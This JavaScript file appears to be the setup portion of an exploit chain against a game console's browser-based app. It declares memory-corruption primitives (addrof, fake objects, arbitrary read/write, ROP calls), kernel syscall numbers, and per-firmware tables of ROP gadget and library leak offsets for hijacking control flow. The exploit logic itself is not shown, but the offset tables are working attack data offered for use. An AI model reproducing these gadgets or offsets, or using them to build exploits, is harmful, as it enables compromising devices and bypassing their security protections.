// Global functions
let addrof;
let read64;
let write64;
let create_fakeobj;
let read8;
let write8;
let read16;
let write16;
let read32;
let write32;
let get_backing_store;
let malloc;
let pwn;
let get_bytecode_addr;
let call_rop;
let call;
let syscall;

let Thrd_create;
let Thrd_join;

// Global objects
let allocated_buffers = [];
let eboot_base = 0n;
let libc_base = 0n;
let libcobalt_base = 0n;
let libstarboard_base = 0n;

let libc_strerror;
let libc_error;
let return_value_addr;
let libkernel_base;
let syscall_wrapper;
let rop_chain;
let fake_bc;
let fake_frame;
let return_value_buf;
let saved_fp = 0n;

let FW_VERSION;
let TITLE_ID;
let Y2_VERSION;

const PAGE_SIZE = 0x4000;
const PHYS_PAGE_SIZE = 0x1000;

const STDIN_FILENO = 0n;
const STDOUT_FILENO = 1n;
const STDERR_FILENO = 2n;

const AF_INET = 2n;
const AF_INET6 = 28n;
const SOCK_STREAM = 1n;
const SOCK_DGRAM = 2n;
const IPPROTO_UDP = 17n;
const IPPROTO_IPV6 = 41n;
const IPV6_PKTINFO = 46n;
const INADDR_ANY = 0n;

const SOL_SOCKET = 0xffffn;
const SO_REUSEADDR = 4n;

const PROT_NONE = 0x0n;
const PROT_READ = 0x1n;
const PROT_WRITE = 0x2n;
const PROT_EXEC  = 0x4n;
const PROT_RWX   = PROT_READ | PROT_WRITE | PROT_EXEC;

const GPU_READ = 0x10n;
const GPU_WRITE = 0x20n;
const GPU_RW = 0x30n;

const MAP_SHARED = 0x1n;
const MAP_PRIVATE = 0x2n;
const MAP_FIXED = 0x10n;
const MAP_ANONYMOUS = 0x1000n;
const MAP_NO_COALESCE = 0x400000n;

const O_RDONLY = 0n;
const O_WRONLY = 1n;
const O_RDWR = 2n;
const O_CREAT = 0x200n;
const O_TRUNC = 0x400n;
const O_APPEND = 0x8n;
const O_NONBLOCK = 0x4n;

const SIGILL = 4n;
const SIGKILL = 9n;
const SIGBUS = 10n;
const SIGSEGV = 11n;
const SA_SIGINFO = 0x4n;

const LIBKERNEL_HANDLE = 0x2001n;

let ROP;

let ROP_403 = {
    get pop_rsp()             { return eboot_base + 0x49f7fn;   },
    get pop_rax()             { return eboot_base + 0x2d954n;   },
    get pop_rdi()             { return eboot_base + 0xb0ec5n;   },
    get pop_rsi()             { return eboot_base + 0xb8a81n;   },
    get pop_rdx()             { return eboot_base + 0xb692n;    },
    get pop_rcx()             { return eboot_base + 0x187da3n;  },
    get pop_r8()              { return eboot_base + 0x1a8ff9n;  },
    get pop_r9()              { return eboot_base + 0x1394e01n; },
    get pop_rbp()             { return eboot_base + 0x69n;      },
    get mov_qword_rdi_rax()   { return eboot_base + 0x49a77n;   },
    get mov_qword_rdi_rdx()   { return eboot_base + 0x3a3b95n;  },
    get mov_rax_0x200000000() { return eboot_base + 0x1283d40n; },
    get mov_rsp_rbp()         { return eboot_base + 0xb1424n;   },
    get ret()                 { return eboot_base + 0x32n;      },
};

let ROP_1220 = {
    get pop_rsp()             { return libcobalt_base + 0xa59cn;   },
    get pop_rax()             { return libcobalt_base + 0x1ab82n;  },
    get pop_rdi()             { return libcobalt_base + 0x4cbn;    },
    get pop_rsi()             { return libcobalt_base + 0x1174n;   },
    get pop_rdx()             { return libcobalt_base + 0x108f12n; },
    get pop_rcx()             { return libcobalt_base + 0xc18en;   },
    get pop_r8()              { return libcobalt_base + 0x1ab81n;  },
    get pop_r9()              { return libcobalt_base + 0x3bf622n; },
    get pop_rbp()             { return libcobalt_base + 0xc6n;     },
    get mov_qword_rdi_rax()   { return libcobalt_base + 0x561bcn;  },
    get mov_qword_rdi_rdx()   { return libcobalt_base + 0x4f75edn; },
    get mov_rax_0x200000000() { return libcobalt_base + 0x2c4e10n; },
    get mov_rsp_rbp()         { return libcobalt_base + 0x7ad24cn; },
    get ret()                 { return libcobalt_base + 0x42n;     },
};

let ROP_1320 = {
    get pop_rsp()             { return libcobalt_base + 0x6f7c7n;  },
    get pop_rax()             { return libcobalt_base + 0x35942n;  },
    get pop_rdi()             { return libcobalt_base + 0x54bn;    },
    get pop_rsi()             { return libcobalt_base + 0x26a5n;   },
    get pop_rdx()             { return libcobalt_base + 0x81300n;  },
    get pop_rcx()             { return libcobalt_base + 0x25e9n;   },
    get pop_r8()              { return libcobalt_base + 0x35941n;  },
    get pop_r9()              { return libcobalt_base + 0x3d9132n; },
    get pop_rbp()             { return libcobalt_base + 0xc6n;     },
    get mov_qword_rdi_rax()   { return libcobalt_base + 0x6fcecn;  },
    get mov_qword_rdi_rdx()   { return libcobalt_base + 0x510fddn; },
    get mov_rax_0x200000000() { return libcobalt_base + 0x2de890n; },
    get mov_rsp_rbp()         { return libcobalt_base + 0x7c79acn; },
    get ret()                 { return libcobalt_base + 0x31n;     },
};


let Y2_OFFSET;

let Y2_OFFSET_403 = {
    EBOOT_LEAK : 0xFBC81Fn,
    LIBC_LEAK1 : 0x2A66660n,
    LIBC_LEAK2 : 0x851A0n,
    RSP_OFFSET : 0x8n,
    
    get sceMsgDialogTerminate()          { return eboot_base + 0x2A65C60n; },
    get sceErrorDialogTerminate()        { return eboot_base + 0x2A65C68n; },
    get sceKernelGetModuleInfoFromAddr() { return libc_base  + 0x113C08n;  },
    get gettimeofday()                   { return libc_base  + 0x113B18n;  },
    
    get libc_strerror()                  { return libc_base  + 0x73520n;   },
    get libc_error()                     { return libc_base  + 0xCC5A0n;   },
    
    get Thrd_create()                    { return libc_base  + 0x4BF0n;    },
    get Thrd_join()                      { return libc_base  + 0x49F0n;    },
    
}

let Y2_OFFSET_1220 = {
    LIBCOBALT_LEAK : 0x7DFFDFn,
    LIBSTARBOARD_LEAK1 : 0x1AD05D0n,
    LIBSTARBOARD_LEAK2 : 0x6D9B0n,
    LIBC_LEAK1 : 0x99CCD0n,
    LIBC_LEAK2 : 0x3EE20n,
    RSP_OFFSET : 0x10n,
    
    get sceMsgDialogTerminate()          { return libstarboard_base + 0x99D550n; },
    get sceErrorDialogTerminate()        { return libstarboard_base + 0x99D558n; },
    get sceKernelGetModuleInfoFromAddr() { return libc_base         + 0x113C08n; },
    get gettimeofday()                   { return libc_base         + 0x113B18n; },
    
    get libc_strerror()                  { return libc_base         + 0x73520n;  },
    get libc_error()                     { return libc_base         + 0xCC5A0n;  },
    
    get Thrd_create()                    { return libc_base         + 0x4BF0n;   },
    get Thrd_join()                      { return libc_base         + 0x49F0n;   },
    
}

let Y2_OFFSET_1320 = {
    LIBCOBALT_LEAK : 0x7FA73Fn,
    LIBSTARBOARD_LEAK1 : 0x2483B20n,
    LIBSTARBOARD_LEAK2 : 0x3D5D0n,
    LIBC_LEAK1 : 0x52DBA0n,
    LIBC_LEAK2 : 0x3AD00n,
    RSP_OFFSET : 0x10n,
    
    get sceMsgDialogTerminate()          { return libstarboard_base + 0x52E4D8n; },
    get sceErrorDialogTerminate()        { return libstarboard_base + 0x52E4E8n; },
    get sceKernelGetModuleInfoFromAddr() { return libc_base         + 0x19E488n; },
    get gettimeofday()                   { return libc_base         + 0x19E348n; },
    
    get libc_strerror()                  { return libc_base         + 0x6EAC0n;  },
    get libc_error()                     { return libc_base         + 0x11D1B0n;  },
    
    get Thrd_create()                    { return libc_base         + 0x50A0n;   },
    get Thrd_join()                      { return libc_base         + 0x4EA0n;   },
    
}

let SYSCALL = {
    read: 0x3n,
    write: 0x4n,
    open: 0x5n,
    close: 0x6n,
    setuid: 0x17n,
    getuid: 0x18n,
    accept: 0x1en,
    pipe: 0x2an,
    mprotect: 0x4an,
    socket: 0x61n,
    connect: 0x62n,
    bind: 0x68n,
    setsockopt: 0x69n,
    listen: 0x6an,
    getsockopt: 0x76n,
    netgetiflist: 0x7dn,
    sendto: 0x85n,
    sysctl: 0xcan,
    nanosleep: 0xf0n,
    sigaction: 0x1a0n,
    thr_self: 0x1b0n,
    dlsym: 0x24fn,
    dynlib_load_prx: 0x252n,
    dynlib_unload_prx: 0x253n,
    randomized_path: 0x25an,
    is_in_sandbox: 0x249n,
    mmap: 0x1ddn,
    getpid: 0x14n,
    jitshm_create: 0x215n,
    jitshm_alias: 0x216n,
    unlink: 0xan,
    chmod: 0xfn,
    recvfrom: 0x1dn,
    getsockname: 0x20n,
    rename: 0x80n,
    sendto: 0x85n,
    mkdir: 0x88n,
    rmdir: 0x89n,
    stat: 0xbcn,
    getdents: 0x110n,
    lseek: 0x1den,
    dup2: 0x5an,
    fcntl: 0x5cn,
    select: 0x5dn,
    fstat: 0xbdn,
    umtx_op: 0x1c6n,
    cpuset_getaffinity: 0x1e7n,
    cpuset_setaffinity: 0x1e8n,
    rtprio_thread: 0x1d2n,
    ftruncate: 0x1e0n,
    sched_yield: 0x14bn,
    munmap: 0x49n,
    thr_new: 0x1c7n,
    thr_exit: 0x1afn,
    fsync: 0x5fn,
    ioctl: 0x36n,
    kill: 0x25n
};
